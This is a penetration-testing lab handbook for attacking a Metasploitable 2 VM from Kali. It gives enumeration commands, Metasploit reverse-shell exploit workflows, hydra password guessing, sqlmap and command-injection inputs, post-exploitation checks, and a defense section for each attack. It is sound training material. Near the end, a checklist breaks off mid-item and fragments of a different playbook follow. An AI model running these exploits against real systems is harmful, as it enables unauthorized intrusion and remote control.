title: 0. Lab Setup
text: ### 0.1 Required machines - **Attacker:** Kali Linux / Parrot OS / Ubuntu with security tools - **Target:** Metasploitable 2 VM - **Network:** Host-only or isolated internal VM network Recommended VirtualBox setup: 1. Open Metasploitable 2 VM settings. 2. Set Network Adapter to **Host-only Adapter** or **Internal Network**. 3. Put Kali on the same network. 4. Take a snapshot of both VMs before starting. ### 0.2 Find the Metasploitable 2 IP On Kali: ```bash ip a ip route ``` Find your VM subnet, usually something like `192.168.56.0/24`. Run host discovery: ```bash sudo arp-scan --localnet ``` Or: ```bash sudo netdiscover -r 192.168.56.0/24 ``` Or: ```bash sudo nmap -sn 192.168.56.0/24 ``` Set variables for the course: ```bash export MS2=192.168.56.101 export KALI=192.168.56.102 ``` Replace both IPs with your real lab IPs. Test connectivity: ```bash ping -c 4 $MS2 ``` ### 0.3 Start evidence capture In a separate terminal: ```bash sudo tcpdump -i eth0 host $MS2 -w ms2-lab.pcap ``` This lets you show the network traffic created by scans and attacks. --- # Part 1: Recon and Enumeration

title: 1. Quick discovery scan
text: ```bash nmap -sn $MS2 nmap -sS --top-ports 100 -sV $MS2 ``` Expected exposed services include FTP, SSH, Telnet, SMTP, DNS, HTTP, SMB, NFS, MySQL, PostgreSQL, VNC, IRC, and Tomcat.

title: 2. Full TCP scan
text: ```bash sudo nmap -sS -sV -sC -O -p- -T4 -oA ms2_full $MS2 ``` Open results: ```bash ls -lh ms2_full.* less ms2_full.nmap ```

title: 3. UDP scan
text: Metasploitable 2 is mostly TCP-focused, but UDP still matters: ```bash sudo nmap -sU --top-ports 100 -sV -oA ms2_udp $MS2 ```

title: 4. Service inventory
text: Create a clean service list: ```bash grep '^ *[0-9].*open' ms2_full.nmap ``` Typical important services: | Port | Service | Why it matters | |---:|---|---| | 21 | FTP / vsftpd 2.3.4 | Famous backdoor vulnerability | | 22 | SSH | Password auditing and remote access | | 23 | Telnet | Weak plaintext remote access | | 25 | SMTP | User enumeration and mail config review | | 53 | DNS | Version and zone information | | 80 | HTTP | Web apps, phpinfo, DAV, DVWA/Mutillidae | | 111 | RPC | NFS/service discovery | | 139/445 | SMB | Shares, users, usermap exploit path | | 512/513/514 | r-services | Legacy remote access | | 1524 | bind shell | Direct remote shell exposure | | 2049 | NFS | Possible filesystem exposure | | 2121 | ccProxy/FTP | Alternate FTP/proxy service | | 3306 | MySQL | Weak/default DB access | | 3632 | distccd | Remote command execution path | | 5432 | PostgreSQL | Weak/default DB access | | 5900 | VNC | Weak password/remote desktop | | 6000 | X11 | Open display risk | | 6667 | UnrealIRCd | Backdoored IRC daemon | | 6697 | IRC alternate | Possible secondary IRC listener | | 8009 | AJP13 | Tomcat connector exposure | | 8180 | Tomcat | Manager app and WAR upload path | | 8787 | Ruby DRb | Possible remote object/service exposure | --- # Part 2: Service Enumeration Commands

title: 2.1 FTP enumeration
text: ```bash nc -nv $MS2 21 ``` Press `Ctrl+C` after reading the banner. More FTP checks: ```bash nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst $MS2 searchsploit vsftpd ```

title: 2.2 SSH enumeration
text: ```bash nc -nv $MS2 22 ssh -o StrictHostKeyChecking=no msfadmin@$MS2 ``` Lab password for `msfadmin` is usually `msfadmin`. SSH audit: ```bash ssh-audit $MS2 ``` Small lab password list: ```bash cat > ms2-users.txt <<'EOF' msfadmin user postgres service sys klog EOF cat > ms2-passwords.txt <<'EOF' msfadmin user postgres service batman 123456789 EOF hydra -L ms2-users.txt -P ms2-passwords.txt -t 4 -f ssh://$MS2 ``` Use only your own VM and your own lab account list.

title: 2.3 Telnet enumeration
text: ```bash nc -nv $MS2 23 telnet $MS2 ``` Try the lab account: ```text login: msfadmin password: msfadmin ``` Telnet is plaintext and should be treated as insecure by design.

title: 2.4 SMTP user enumeration
text: Manual test: ```bash nc -nv $MS2 25 ``` Inside the SMTP session: ```text VRFY msfadmin VRFY root QUIT ``` Tool-based checks: ```bash nmap -p25 --script smtp-commands,smtp-enum-users $MS2 smtp-user-enum -M VRFY -U ms2-users.txt -t $MS2 ```

title: 2.5 DNS enumeration
text: ```bash dig version.bind CHAOS TXT @$MS2 dig @$MS2 localhost dnsrecon -d localhost -n $MS2 ``` If no useful zone exists, document that instead of forcing a result.

title: 2.6 RPC and NFS enumeration
text: ```bash rpcinfo -p $MS2 showmount -e $MS2 ``` If `/` or a directory is exported: ```bash sudo mkdir -p /mnt/ms2 sudo mount -t nfs $MS2:/ /mnt/ms2 ls -la /mnt/ms2 | head ``` Create a harmless marker only if the lab export allows it: ```bash sudo touch /mnt/ms2/tmp/ms2-lab-marker.txt ls -l /mnt/ms2/tmp/ms2-lab-marker.txt ``` Unmount when done: ```bash sudo umount /mnt/ms2 ```

title: 2.7 SMB enumeration
text: ```bash smbclient -L //$MS2 -N smbmap -H $MS2 enum4linux-ng -A $MS2 ``` More specific checks: ```bash nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users $MS2 ```

title: 2.8 HTTP enumeration
text: ```bash curl -I http://$MS2/ curl http://$MS2/ | head -n 40 nikto -h http://$MS2 dirb http://$MS2 /usr/share/wordlists/dirb/common.txt gobuster dir -u http://$MS2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html ``` Important paths to check manually: ```bash curl -I http://$MS2/phpinfo.php curl -I http://$MS2/mutillidae/ curl -I http://$MS2/dvwa/ curl -I http://$MS2/phpMyAdmin/ curl -I http://$MS2/dav/ curl -I http://$MS2/twiki/ ```

title: 2.9 Database enumeration
text: MySQL: ```bash nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users $MS2 mysql -h $MS2 -u root -p ``` When prompted, try an empty password first in the lab. PostgreSQL: ```bash nmap -p5432 -sV $MS2 psql "host=$MS2 user=postgres password=postgres" ``` Inside `psql`: ```sql \l \du \q ```

title: 2.10 VNC and X11 enumeration
text: VNC: ```bash nmap -p5900 --script vnc-info $MS2 vncviewer $MS2:5900 ``` Common lab VNC password: `password`. X11 check: ```bash nmap -p6000 --script x11-access $MS2 ``` If X11 is open and you have `xwd`: ```bash xwd -root -silent -display $MS2:0 -out ms2-screen.xwd ```

title: 2.11 Other exposed remote services
text: Bind shell: ```bash nc -nv $MS2 1524 id ``` distccd: ```bash nc -nv $MS2 3632 nmap -p3632 --script distcc-cve2004-2687 $MS2 ``` IRC: ```bash nc -nv $MS2 6667 nmap -p6667 --script irc-info $MS2 ``` Tomcat: ```bash curl -I http://$MS2:8180/ curl -I http://$MS2:8180/manager/html ``` Java RMI: ```bash nmap -p1099 --script rmi-vuln-classloader $MS2 ``` Legacy r-services: ```bash nmap -p512,513,514 -sV $MS2 ``` Additional exposed services: ```bash nmap -p2121 -sV $MS2 nc -nv $MS2 2121 nmap -p8009 -sV $MS2 nmap -p8009 --script ajp-methods,ajp-headers,ajp-auth $MS2 nmap -p8787 -sV --script druby-info $MS2 nmap -p6697 -sV $MS2 nc -nv $MS2 6697 ``` More HTTP checks: ```bash curl -I http://$MS2/dvwa/ curl -I http://$MS2/twiki/ curl -I http://$MS2/phpMyAdmin/ curl -I http://$MS2/server-status curl -I http://$MS2/.git/HEAD ``` --- # Part 3: Exploitation Workflows Each attack uses the same method: 1. Identify service and version. 2. Check known vulnerability or misconfiguration. 3. Run the smallest safe proof. 4. Capture evidence. 5. Explain the defense.

title: 3.1 FTP: vsftpd 2.3.4 backdoor
text: ### Check ```bash nmap -p21 -sV $MS2 searchsploit vsftpd 2.3.4 ``` ### Manual lab proof Connect to FTP: ```bash nc -nv $MS2 21 ``` Send the classic backdoor trigger username: ```text USER hacker:) PASS anything ``` The connection may hang or close. Then test the backdoor port: ```bash nc -nv $MS2 6200 id whoami ``` ### Metasploit method ```bash msfconsole -q ``` Inside Metasploit: ```text use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 192.168.56.101 show options run ``` Replace the IP with `$MS2` if your shell expands it inside `msfconsole` or type it manually. ### Evidence - FTP banner showing `vsftpd 2.3.4` - Shell prompt or `id` output ### Defense - Upgrade/remove vsftpd 2.3.4. - Do not expose FTP publicly. - Alert on unexpected port 6200 listeners.

title: 3.2 Bind shell on port 1524
text: ### Check ```bash nc -nv $MS2 1524 id whoami ``` If a shell opens, document it immediately. ### Evidence - Successful TCP connection to 1524 - `id` output showing privilege level ### Defense - Remove the bind shell service. - Firewall inbound access. - Alert on unexplained listeners.

title: 3.3 Samba: usermap script path
text: ### Enumerate ```bash smbclient -L //$MS2 -N smbmap -H $MS2 enum4linux-ng -A $MS2 ``` ### Exploit with Metasploit ```bash msfconsole -q ``` Inside: ```text use exploit/multi/samba/usermap_script set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4444 show options run ``` If successful: ```text id whoami hostname ``` ### Evidence - Samba version/enumeration output - Metasploit session output - `id` result ### Defense - Upgrade Samba. - Disable SMB where unnecessary. - Restrict SMB to trusted segments. - Alert on suspicious SMB write/script behavior.

title: 3.4 UnrealIRCd backdoor
text: ### Check ```bash nmap -p6667 -sV $MS2 nc -nv $MS2 6667 ``` ### Exploit with Metasploit ```text use exploit/unix/irc/unreal_ircd_3281_backdoor set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4445 run ``` ### Defense - Remove or upgrade UnrealIRCd. - Restrict IRC ports. - Monitor outbound reverse connections and unusual IRC commands.

title: 3.5 distccd remote command execution
text: ### Check ```bash nmap -p3632 -sV $MS2 nmap -p3632 --script distcc-cve2004-2687 $MS2 ``` ### Exploit with Metasploit ```text use exploit/unix/misc/distcc_exec set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4446 run ``` ### Defense - Do not expose distccd. - Restrict compiler service to trusted build hosts. - Patch and isolate build infrastructure.

title: 3.6 Tomcat manager upload
text: ### Check ```bash curl -I http://$MS2:8180/manager/html nmap -p8180 -sV $MS2 ``` Try common lab/default credentials in the browser: - `tomcat / tomcat` - `admin / admin` ### Exploit with Metasploit ```text use exploit/multi/http/tomcat_mgr_upload set RHOSTS 192.168.56.101 set RPORT 8180 set HttpUsername tomcat set HttpPassword tomcat set PAYLOAD linux/x86/meterpreter/reverse_tcp set LHOST 192.168.56.102 set LPORT 4447 run ``` If you get a Meterpreter session: ```text sysinfo getuid shell id ``` ### Defense - Remove/secure Tomcat manager. - Strong unique credentials. - Restrict manager by IP. - Monitor WAR uploads.

title: 3.7 MySQL weak access
text: ### Check ```bash nmap -p3306 --script mysql-info,mysql-empty-password $MS2 mysql -h $MS2 -u root -p ``` Inside MySQL: ```sql SELECT user, host FROM mysql.user; SHOW DATABASES; ``` Do not dump private data. The proof is successful unauthorized login and visible databases. ### Defense - Set strong DB credentials. - Bind MySQL to localhost or approved hosts. - Remove anonymous/remote root access. - Alert on remote DB logins.

title: 3.8 PostgreSQL weak access
text: ### Check ```bash psql "host=$MS2 user=postgres password=postgres" ``` Inside: ```sql \l \du \conninfo ``` ### Defense - Strong passwords. - Restrict `pg_hba.conf` network rules. - Bind to localhost or private networks. - Monitor remote DB connections.

title: 3.9 VNC weak password
text: ### Check ```bash nmap -p5900 --script vnc-info $MS2 vncviewer $MS2:5900 ``` Try lab password `password`. ### Defense - Strong VNC password. - Wrap VNC in SSH/VPN. - Restrict source IPs. - Alert on remote desktop attempts.

title: 3.10 X11 open display
text: ### Check ```bash nmap -p6000 --script x11-access $MS2 xwd -root -silent -display $MS2:0 -out ms2-screen.xwd ``` ### Defense - Do not expose X11 over TCP. - Use SSH X forwarding only where needed. - Firewall port 6000.

title: 3.11 WebDAV write access
text: Create a harmless marker file: ```bash echo 'CYBER-AI LAB MARKER' > lab-marker.txt cadaver http://$MS2/dav/ ``` Inside `cadaver`: ```text put lab-marker.txt ls quit ``` Verify: ```bash curl http://$MS2/dav/lab-marker.txt ``` ### Defense - Disable DAV if unused. - Require auth and least-privilege write permissions. - Monitor unexpected uploads.

title: 3.12 Mutillidae SQL injection workflow
text: Open in browser: ```text http://$MS2/mutillidae/ ``` Find forms using Burp or ZAP. Automated lab-only check: ```bash sqlmap -u "http://$MS2/mutillidae/index.php?page=login.php" --forms --batch --level=2 --risk=1 --current-db ``` You can also test only banner/version disclosure: ```bash sqlmap -u "http://$MS2/mutillidae/index.php?page=login.php" --forms --batch --level=1 --risk=1 --banner ``` ### Defense - Parameterized queries. - Least-privilege DB accounts. - Safe error handling. - WAF only as an extra layer, not the main fix.

title: 3.13 Password guessing against lab services
text: Create small lab-only lists: ```bash cat > lab-users.txt <<'EOF' msfadmin user postgres service EOF cat > lab-passwords.txt <<'EOF' msfadmin user postgres service password EOF ``` SSH: ```bash hydra -L lab-users.txt -P lab-passwords.txt -t 4 -f ssh://$MS2 ``` Telnet: ```bash hydra -L lab-users.txt -P lab-passwords.txt -t 4 -f telnet://$MS2 ``` MySQL: ```bash hydra -L lab-users.txt -P lab-passwords.txt -t 4 -f mysql://$MS2 ``` ### Defense - Rate limiting/lockout. - MFA where possible. - No default passwords. - Central logging and alerts.

title: 3.14 Java RMI service
text: ### Check ```bash nmap -p1099 --script rmi-vuln-classloader $MS2 ``` ### Exploit with Metasploit ```text use exploit/multi/misc/java_rmi_server set RHOSTS 192.168.56.101 set PAYLOAD java/meterpreter/reverse_tcp set LHOST 192.168.56.102 set LPORT 4448 run ``` ### Defense - Disable unnecessary RMI exposure. - Patch Java services. - Restrict by network policy.

title: 3.15 Legacy r-services
text: ### Check ```bash nmap -p512,513,514 -sV $MS2 ``` If rlogin is available on Kali: ```bash rlogin -l msfadmin $MS2 ``` ### Defense - Disable rexec/rlogin/rsh. - Use SSH only. - Alert on legacy service exposure.

title: 3.16 DVWA guided web attacks
text: DVWA is included inside Metasploitable 2 and is useful for showing web attacks cleanly. ### Check ```bash curl -I http://$MS2/dvwa/ ``` Open in browser: ```text http://$MS2/dvwa/setup.php ``` Use the setup page to create/reset the lab database. Default lab login is usually: ```text admin / password ``` Set DVWA security to **Low** for the first demo. ### SQL injection workflow Capture the SQL Injection request in Burp Suite or ZAP. Then run a lab-only sqlmap proof: ```bash sqlmap -u "http://$MS2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \ --cookie="PHPSESSID=<YOUR_SESSION>; security=low" \ --batch --current-db ``` Keep the proof to database/version confirmation. Do not dump unnecessary data. ### Command injection workflow On the DVWA command injection page, use a harmless `id` proof instead of a damaging command: ```text 127.0.0.1; id ``` For video, show the returned command output, then explain why shell metacharacters reached a system command. ### File inclusion workflow Use a harmless local file such as `/etc/hostname` for the proof. Avoid dumping password files or credentials. ### Defense - Parameterized queries. - Safe process APIs instead of shell commands. - Strict include path allowlists. - Output encoding for XSS pages. - Server-side validation and least privilege.

title: 3.17 TWiki legacy web app path
text: Metasploitable 2 commonly includes TWiki under Apache. ### Check ```bash curl -I http://$MS2/twiki/ nmap -p80 --script http-enum $MS2 searchsploit twiki ``` ### Metasploit workflow ```bash msfconsole -q ``` Inside Metasploit: ```text search twiki ``` Choose a module matching the detected TWiki version. Typical pattern: ```text use exploit/unix/webapp/twiki_history info set RHOSTS 192.168.56.101 set TARGETURI /twiki set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4449 run ``` If that module does not match your build, return to `search twiki` and select the matching result. ### Defense - Remove unused legacy web apps. - Patch or replace TWiki. - Restrict admin and executable paths. - Monitor web-server child processes.

title: 3.18 phpMyAdmin exposure
text: ### Check ```bash curl -I http://$MS2/phpMyAdmin/ nmap -p80 --script http-enum $MS2 ``` In the browser, test only lab credential ideas: ```text root / <empty> root / root phpmyadmin / phpmyadmin ``` If login succeeds, proof is successful admin access. Do not dump databases. ### Defense - Remove phpMyAdmin or protect it behind VPN/IP restrictions. - Strong DB credentials. - No remote root login. - Alert on database admin UI access.

title: 3.19 Alternate FTP service on port 2121
text: ### Check ```bash nmap -p2121 -sV $MS2 nc -nv $MS2 2121 ftp $MS2 2121 ``` If prompted, try anonymous FTP only in the lab: ```text anonymous anonymous@example.test ``` ### Defense - Remove unnecessary FTP services. - Disable anonymous login. - Restrict to trusted networks.

title: 3.20 AJP connector on port 8009
text: AJP is a Tomcat connector. Exposure is usually a misconfiguration unless external apps need it. ### Check ```bash nmap -p8009 -sV $MS2 nmap -p8009 --script ajp-methods,ajp-headers,ajp-auth $MS2 ``` ### Defense - Bind AJP to localhost or trusted reverse proxies. - Disable AJP if unused. - Restrict 8009 by firewall.

title: 3.21 Ruby DRb service
text: Some Metasploitable 2 builds expose a Ruby distributed object service. ### Check ```bash nmap -p8787 -sV --script druby-info $MS2 ``` ### Metasploit workflow ```text search drb use exploit/linux/misc/drb_remote_codeexec set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4450 run ``` If the module name differs, use the result from `search drb`. ### Defense - Disable unnecessary DRb services. - Restrict service exposure. - Patch Ruby service dependencies.

title: 3.22 Telnet plaintext access proof
text: Telnet is useful for teaching why plaintext remote access is dangerous. ### Check ```bash telnet $MS2 ``` Login with the lab account: ```text msfadmin / msfadmin ``` Capture plaintext traffic while logging in: ```bash sudo tcpdump -i eth0 host $MS2 and port 23 -A ``` ### Evidence - Successful login - Packet capture showing plaintext protocol behavior ### Defense - Disable Telnet. - Use SSH. - Alert on Telnet service exposure.

title: 3.23 HTTP information disclosure
text: ### Check ```bash curl http://$MS2/phpinfo.php curl -I http://$MS2/server-status curl -I http://$MS2/server-info curl -I http://$MS2/.git/HEAD ``` Check for backup/config/source files: ```bash gobuster dir -u http://$MS2 \ -w /usr/share/wordlists/dirb/common.txt \ -x bak,old,conf,config,sql,zip,tar,txt ``` ### Defense - Disable `server-status` and `server-info` publicly. - Do not deploy `.git`, backups, configs, or source archives. - Remove `phpinfo.php` in production. - Scan deployments for exposed files. --- # Part 4: Metasploit Course

title: 4.1 Start Metasploit correctly
text: ```bash sudo msfdb init msfconsole -q ``` Create a workspace: ```text workspace -a ms2-course workspace ``` Import scan results: ```text db_import /path/to/ms2_full.xml services hosts ``` Or run `db_nmap` directly: ```text db_nmap -sS -sV -p- 192.168.56.101 services ```

title: 4.2 Searching modules
text: ```text search vsftpd search samba usermap search unreal ircd search distcc search tomcat manager search java rmi ```

title: 4.3 Standard exploit pattern
text: ```text use exploit/path/module info show options set RHOSTS 192.168.56.101 set PAYLOAD payload/name set LHOST 192.168.56.102 set LPORT 4444 check run ``` If no `check` result exists, document that the module cannot safely pre-check.

title: 4.4 Sessions
text: ```text sessions -l sessions -i 1 background sessions -K ``` Inside a command shell session: ```bash id whoami hostname uname -a ip a ```

title: 4.5 Meterpreter basics
text: ```text sysinfo getuid pwd ls shell ``` Use `exit` to leave the shell and `background` to keep the session.

title: 4.6 Metasploit evidence to record
text: - Module name - Options used - Target IP/port - Session ID - `id`, `hostname`, `sysinfo` - Why the service was vulnerable - What fix removes the path --- # Part 5: Post-Exploitation Checks Use these commands only inside your lab shell.

title: 5.1 Identity and context
text: ```bash id whoami hostname uname -a cat /etc/os-release ```

title: 5.2 Network position
text: ```bash ip a ip route ss -tulpn netstat -tulpn arp -a ```

title: 5.3 Process and service review
text: ```bash ps aux | head -n 40 ps aux | grep -E 'apache|mysql|postgres|irc|samba|distcc|vnc' ```

title: 5.4 Local privilege indicators
text: ```bash sudo -l find / -perm -4000 -type f 2>/dev/null | head -n 50 ls -la /home crontab -l ```

title: 5.5 Persistence awareness
text: Do not install persistence. Learn where it would appear: ```bash ls -la /etc/rc*.d | head ls -la /etc/cron* | head ls -la ~/.ssh ls -la /etc/init.d | head ```

title: 5.6 Logs and detection
text: ```bash sudo tail -n 100 /var/log/auth.log sudo tail -n 100 /var/log/apache2/access.log sudo tail -n 100 /var/log/apache2/error.log last | head who w ``` Look for: - New remote logins - Scanner user agents - Failed password attempts - Unexpected service connections - New uploaded files - Weird process names or listeners

title: 5.7 Cleanup
text: When finished: 1. Close sessions. 2. Remove harmless marker files you created. 3. Stop tcpdump. 4. Revert Metasploitable 2 to snapshot. --- # Part 6: Defense and Hardening

title: 6.1 Service hardening matrix
text: | Service | Main risk | Fix | |---|---|---| | vsftpd 2.3.4 | Backdoor | Upgrade/remove FTP | | Telnet | Plaintext weak access | Disable; use SSH | | SMB | usermap/share exposure | Patch, restrict, least privilege | | NFS | Exported filesystem | Restrict exports, no root squash issues | | MySQL/Postgres | Weak/default access | Strong auth, bind localhost/private | | VNC/X11 | Remote screen exposure | SSH/VPN, strong auth, firewall | | distccd | Command execution | Remove or restrict | | UnrealIRCd | Backdoor | Upgrade/remove | | Tomcat | Manager WAR upload | Restrict manager, strong creds | | HTTP/DAV | Upload/info disclosure | Disable DAV, auth, least privilege | | r-services | Legacy remote access | Disable, use SSH |

title: 6.2 Simple firewall concept
text: Allow SSH only from the attacker management network: ```bash sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.56.0/24 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 22 -j DROP ``` Do not run random firewall changes on a real machine unless you know how to recover console access.

title: 6.3 Monitoring ideas
text: - Detect port scans: many connection attempts across ports. - Detect password guessing: repeated auth failures. - Detect reverse shells: unexpected outbound TCP from a server process. - Detect bind shells: unexpected listening ports. - Detect file upload abuse: new executable/config files in web directories. - Detect database exposure: remote DB logins from unexpected sources. --- # Part 7: Practice Schedule

title: Day 1: Lab setup and discovery
text: - Build host-only network. - Find `$MS2` and `$KALI`. - Run `arp-scan`, `nmap -sn`, full TCP scan. - Save `ms2_full.*` output.

title: Day 2: Service enumeration
text: - FTP, SSH, Telnet, SMTP, DNS. - RPC/NFS and SMB. - Create your own service/risk table.

title: Day 3: First shells
text: - vsftpd backdoor. - Bind shell on 1524. - Samba usermap. - Record `id`, `hostname`, module output.

title: Day 4: More exploitation paths
text: - UnrealIRCd. - distccd. - Java RMI. - Compare bind shell vs reverse shell behavior.

title: Day 5: Web application practice
text: - `phpinfo.php` review. - WebDAV marker upload. - Mutillidae/DVWA manual web testing. - sqlmap database proof without dumping data.

title: Day 6: Databases and remote access
text: - MySQL weak access. - PostgreSQL weak access. - VNC weak password. - X11 exposure if installed.

title: Day 7: Post-exploitation and detection
text: - Identity, processes, network, persistence locations. - Review logs. - Write one detection per attack.

title: Day 8: Report and retest
text: - Write findings. - Apply fixes conceptually or snapshot a hardened clone. - Re-run the original test. - Document whether the path is gone. --- # Part 8: Attack Report Template Use this for every finding: ```text Title: Target IP: Service/port: Affected version/config: Method: Commands/tools used: Evidence: Impact: Likelihood: Recommended fix: Retest result: Residual risk: ``` Example: ```text Title: vsftpd 2.3.4 backdoor gives remote shell Target IP: 192.168.56.101 Service/port: FTP/21 Affected version/config: vsftpd 2.3.4 Method: Triggered known backdoor and connected to port 6200 Commands/tools used: nmap, nc, Metasploit vsftpd_234_backdoor Evidence: FTP banner, shell id output Impact: Remote command execution as vulnerable service user Likelihood: High on exposed vulnerable service Recommended fix: Remove/upgrade FTP, restrict service, monitor port 6200 Retest result: Pending Residual risk: Lab VM only ``` --- # Part 9: Command Cheat Sheet

title: Discovery
text: ```bash sudo arp-scan --localnet sudo netdiscover -r 192.168.56.0/24 nmap -sn 192.168.56.0/24 sudo nmap -sS -sV -sC -O -p- -T4 -oA ms2_full $MS2 sudo nmap -sU --top-ports 100 -sV -oA ms2_udp $MS2 ```

title: Enumeration
text: ```bash nc -nv $MS2 21 nc -nv $MS2 23 nc -nv $MS2 25 rpcinfo -p $MS2 showmount -e $MS2 smbclient -L //$MS2 -N smbmap -H $MS2 enum4linux-ng -A $MS2 nikto -h http://$MS2 gobuster dir -u http://$MS2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html ```

title: Metasploit pattern
text: ```text use exploit/path/module set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4444 run sessions -l sessions -i 1 ```

title: Lab post-exploitation
text: ```bash id whoami hostname uname -a ip a ss -tulpn ps aux | head sudo -l crontab -l sudo tail -n 100 /var/log/auth.log ``` --- # Part 10: Video Series Ideas from This Lab 1. **Finding the target:** host discovery and nmap. 2. **The fastest shell:** vsftpd 2.3.4. 3. **Samba explained:** enumeration to usermap. 4. **Bind shell vs reverse shell:** use 1524 and Metasploit payload sessions. 5. **Why default credentials are dangerous:** SSH/Telnet/MySQL/VNC. 6. **NFS misconfiguration:** exported filesystem exposure. 7. **WebDAV write access:** harmless marker upload. 8. **Tomcat manager:** weak admin interface to WAR deployment. 9. **Database exposure:** MySQL and PostgreSQL remote access. 10. **How defenders see it:** tcpdump, logs, alerts, and cleanup. --- # Part 11: Metasploitable 2 Coverage Checklist This checklist maps the usual exposed Metasploitable 2 services to the workflow in this handbook. Builds can vary, so if a port is closed on your VM, mark it **not present** instead of forcing a result. - **FTP/21 `vsftpd 2.3.4`:** Enumeration 2.1, exploit 3.1 - **SSH/22:** Enumeration 2.2, password audit 3.13 - **Telnet/23:** Enumeration 2.3, plaintext proof 3.22 - **SMTP/25:** User enumeration 2.4 - **DNS/53:** Version/zone checks 2.5 - **HTTP/80:** Enumeration 2.8; WebDAV 3.11; Mutillidae 3.12; DVWA 3.16; TWiki 3.17; phpMyAdmin 3.18; info disclosure 3.23 - **RPC/111:** RPC/NFS discovery 2.6 - **SMB/139,445:** SMB enumeration 2.7, usermap exploit 3.3 - **rexec/rlogin/rsh 512-514:** Legacy checks 3.15 - **Java RMI/1099:** RMI check and Metasploit workflow 3.14 - **Bind shell/1524:** Direct shell check 3.2 - **NFS/2049:** Export discovery/mount proof 2.6 - **ccProxy/FTP/2121:** Alternate FTP check 3.19 - **MySQL/3306:** Weak access workflow 3.7 - **distccd/3632:** Remote exec

title: What “everything” means here
text: - Every **major exposed service** has an enumeration or exploitation section. - Every **common Metasploitable 2 exploit path** is included: FTP backdoor, bind shell, Samba usermap, IRC backdoor, distccd, Tomcat manager, NFS, weak DB access, weak remote access, WebDAV, web app vulnerabilities, and password auditing. - Some services are **enumeration/hardening targets**, not reliable exploit paths on every build. - VM builds vary. Your `nmap -sV -p- $MS2` output is the real source of truth. --- # Final Lab Rules - Snapshot before every major attack. - Use test credentials only inside the VM. - Do not practice persistence, credential theft, spam, phishing, or real-account targeting. - Always show the fix after the attack. - Revert the VM when the lesson is done.

title: Scope
text: This playbook contains 71 attack/testing workflows organized like a real security assessment. It covers recon, infrastructure, web, API, identity, wireless, Active Directory, privilege escalation, cloud, Kubernetes, mobile, firmware, IoT, human security, malware analysis, detection, forensics, reporting, and retesting. The methods are written for systems you own or are explicitly authorized to test. The goal is to understand the attack path, prove impact safely, and teach the defense.

title: Real-World Frameworks Used
text: - **PTES:** scoping, intelligence gathering, threat modeling, exploitation, post-exploitation, reporting. - **OWASP WSTG / OWASP Top 10:** web application testing structure. - **OWASP API Security Top 10:** API-specific attack surface. - **MITRE ATT&CK:** attacker behavior and defensive mapping. - **NIST-style remediation:** identify, protect, detect, respond, recover.

title: Universal Method for Every Attack
text: 1. Define scope and permission. 2. Build or select a legal lab target. 3. Map the attack surface. 4. Form one testable hypothesis. 5. Run the smallest safe proof. 6. Capture evidence. 7. Explain why it worked. 8. Apply the defense. 9. Retest the same path. 10. Report the residual risk.

title: Video/Report Formula
text: For each attack, show: **target setup -> attack path -> proof -> why it worked -> defense -> retest.** That is more credible than only showing a tool output.

title: Foundation & Methodology
text: ### 1. Rules of Engagement and Lab Design **Objective:** Build a legal, repeatable environment for practicing attacks without touching real victims or production systems. **Safe lab:** Dedicated VMs, snapshots, intentionally vulnerable apps, dummy accounts, fake data, and a written scope. **Tools to use:** - **VirtualBox/VMware/UTM:** Isolate attacker and victim machines - **Docker:** Run disposable vulnerable apps - **Obsidian/Dradis:** Track evidence and findings - **DVWA/Juice Shop/WebGoat/Vulhub:** Practice against legal targets **Method steps:** 1. Write down the target owner, allowed IPs/domains, allowed time, prohibited actions, and emergency contacts. 2. Create test users, dummy credentials, fake records, and intentionally weak configurations. 3. Snapshot every VM before testing and after building each scenario. 4. Separate lab traffic from production and personal devices. 5. Define proof standards: screenshot, request/response, log line, alert, or config diff. 6. End every test with a remediation and retest, not just exploitation. **Evidence to capture:** Scope document, asset inventory, lab diagram, snapshots, test calendar, approved actions. **Defense to teach:** A controlled lab lets you practice aggressively while staying legal and repeatable. **Search words:** lab, scope, rules, methodology, hacking lab ### 2. Assessment Methodology **Objective:** Use a repeatable assessment lifecycle instead of randomly trying payloads. **Safe lab:** Any authorized target or lab. **Tools to use:** - **PTES:** Penetration Testing Execution Standard - **OWASP WSTG:** Web testing methodology - **OWASP API Top 10:** API-specific testing - **MITRE ATT&CK:** Behavior and detection mapping **Method steps:** 1. Start with intelligence gathering and threat modeling. 2. Map attack

text: ### 62. title: Reporting & Remediation
text: ### 70. title: Workflow 1: Lab network setup and target discovery
text: **Goal:** Put Kali and Metasploitable 2 on the same isolated network, find the target IP, and set reusable shell variables. **Before you start:** Both VMs must be on Host-only or the same Internal Network. Snapshot both before testing. ### Step 1: Check Kali IP **Command:** ```bash ip a ``` **What this does:** Shows your local interfaces and IP address. **What to look for:** Find the VM interface, often `eth0`, and note its subnet. **Next move:** Use that subnet to discover the target. ### Step 2: Discover live hosts **Command:** ```bash sudo arp-scan --localnet ``` **What this does:** Sends ARP requests on the local network to discover live machines. **What to look for:** Look for the Metasploitable VM MAC/IP, often a VirtualBox/VMware MAC. **Next move:** Set the discovered IP as `$MS2`. ### Step 3: Alternative discovery **Command:** ```bash sudo nmap -sn 192.168.56.0/24 ``` **What this does:** Performs a ping sweep without port scanning. **What to look for:** A short list of live hosts. **Next move:** If several hosts appear, compare MAC vendors or temporarily isolate MS2. ### Step 4: Set target variable **Command:** ```bash export MS2=192.168.56.101 ``` **What this does:** Stores the Metasploitable IP in a shell variable. **What to look for:** 